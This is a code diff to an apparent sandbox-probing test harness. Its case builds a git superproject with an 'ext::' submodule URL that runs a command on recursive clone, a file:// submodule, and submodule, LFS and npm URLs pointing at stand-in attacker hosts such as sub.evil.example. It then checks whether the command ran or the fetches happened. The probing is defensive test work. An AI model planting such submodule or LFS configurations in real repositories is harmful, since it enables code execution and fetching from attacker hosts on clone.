@@ -703,7 +703,7 @@ def git(args, cwd, timeout=60):
            "GIT_COMMITTER_NAME": "isk", "GIT_COMMITTER_EMAIL": "isk@example.invalid"}
     try:
         r = subprocess.run(["git", *args], cwd=cwd, env=env, capture_output=True, timeout=timeout)
-        return {"git": " ".join(args[:2])[:60], "exit": r.returncode, "err": r.stderr.decode(errors="replace")[-240:], "out": r.stdout.decode(errors="replace")[:80]}
+        return {"git": " ".join(args[:2])[:60], "exit": r.returncode, "err": r.stderr.decode(errors="replace")[-1200:], "out": r.stdout.decode(errors="replace")[:2000]}
     except Exception as e:  # noqa: BLE001
         return {"git": " ".join(args[:2])[:60], "error": type(e).__name__}
 
@@ -725,29 +725,32 @@ def case_install_git_submodule(nonce, gw, canary):
     head = git(["rev-parse", "HEAD"], src).get("out", "").strip() or "0" * 40
     steps.append(git(["init", "-q", "-b", "main", sup], base))
     with open(f"{sup}/.gitmodules", "w") as f:
-        f.write(f'[submodule "ext"]\n\tpath = ext\n\turl = ext::{marker} %S\n'
-                f'[submodule "file"]\n\tpath = file\n\turl = file://{src}\n'
-                f'[submodule "http"]\n\tpath = http\n\turl = https://evil.example/isk-{nonce}.git\n')
+        f.write(f'[submodule "file"]\n\tpath = file\n\turl = file://{src}\n'
+                f'[submodule "ext"]\n\tpath = ext\n\turl = ext::{marker} %S\n'
+                f'[submodule "http"]\n\tpath = http\n\turl = https://sub.evil.example/isk-{nonce}.git\n')
     with open(f"{sup}/.gitattributes", "w") as f:
         f.write("*.bin filter=lfs diff=lfs merge=lfs -text\n")
     with open(f"{sup}/.lfsconfig", "w") as f:
-        f.write(f"[lfs]\n\turl = https://evil.example/isk-{nonce}.git/info/lfs\n")
+        f.write(f"[lfs]\n\turl = https://lfs.evil.example/isk-{nonce}.git/info/lfs\n")
     with open(f"{sup}/big.bin", "w") as f:
         f.write("version https://git-lfs.github.com/spec/v1\noid sha256:" + "a" * 64 + "\nsize 1048576\n")
-    for path in ("ext", "file", "http"):
+    # The gitlinks go in by hand (no folder of theirs in the work tree), so the other files are added
+    # by name: `git add .` would take the gitlinks out again as deleted.
+    for path in ("file", "ext", "http"):
         steps.append(git(["update-index", "--add", "--cacheinfo", f"160000,{head},{path}"], sup))
-    steps += [git(["add", "."], sup), git(["commit", "-qm", "super"], sup)]
+    steps += [git(["add", ".gitmodules", ".gitattributes", ".lfsconfig", "big.bin"], sup), git(["commit", "-qm", "super"], sup)]
+    listed = git(["ls-tree", "HEAD"], sup).get("out", "")
     clone = f"/work/clone-{nonce}"
     cl = git(["clone", "--recurse-submodules", sup, clone], "/tmp", timeout=90)
     lfs = git(["lfs", "version"], "/tmp", timeout=10)
     lfs_pull = git(["lfs", "pull"], clone, timeout=30) if lfs.get("exit") == 0 and os.path.isdir(clone) else None
     try:
         r = subprocess.run(["npm", "install", "--prefix", f"/tmp/npm-{nonce}", "--no-audit", "--no-fund", "--ignore-scripts",
-                            f"git+https://evil.example/isk-npm-{nonce}.git"], capture_output=True, timeout=60)
+                            f"git+https://npm.evil.example/isk-npm-{nonce}.git"], capture_output=True, timeout=60)
         npm = {"exit": r.returncode, "err": r.stderr.decode(errors="replace")[-200:]}
     except Exception as e:  # noqa: BLE001
         npm = {"error": type(e).__name__}
-    return {"setup": [x for x in steps if x.get("exit") not in (0, None) or x.get("error")][:6], "clone": cl, "lfs": lfs, "lfs_pull": lfs_pull, "npm": npm,
+    return {"setup": [x for x in steps if x.get("exit") not in (0, None) or x.get("error")][:6], "gitlinks": listed.count("160000"), "clone": cl, "lfs": lfs, "lfs_pull": lfs_pull, "npm": npm,
             "cloned": os.path.isdir(f"{clone}/.git"), "file_followed": os.path.exists(f"{clone}/file/isk-file-{nonce}"),
             "ext_ran": os.path.exists(f"/work/isk-ext-ran-{nonce}")}
 
